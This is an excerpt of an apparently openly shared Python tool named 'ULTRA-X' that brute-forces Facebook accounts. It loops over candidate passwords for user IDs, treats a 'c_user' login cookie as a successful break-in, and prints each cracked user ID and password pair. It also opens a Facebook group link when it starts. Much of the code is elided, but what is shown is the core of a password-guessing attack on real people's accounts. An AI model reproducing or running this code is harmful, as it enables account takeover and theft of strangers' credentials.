...
\033[1;94m       [+]        CREATED BY   :  DABIT SULTAN ATIK               \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  SF-ATIK               \033[1;94m[+]

\033[1;94m       [+]        TEAM         :  NO        \033[1;94m[+]

\033[1;94m       [+]        TOOL VERSION :  1.0.5                    \033[1;94m[+]
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('xdg-open https://facebook.com/groups/207289208661323/')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mULTRA-X\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[100-X-OK💉] {uid} | {ps}")
                ...
                print(f"\x1b[38;5;196m[ULTRA-X-CP🥴] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[ULTRA-X👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
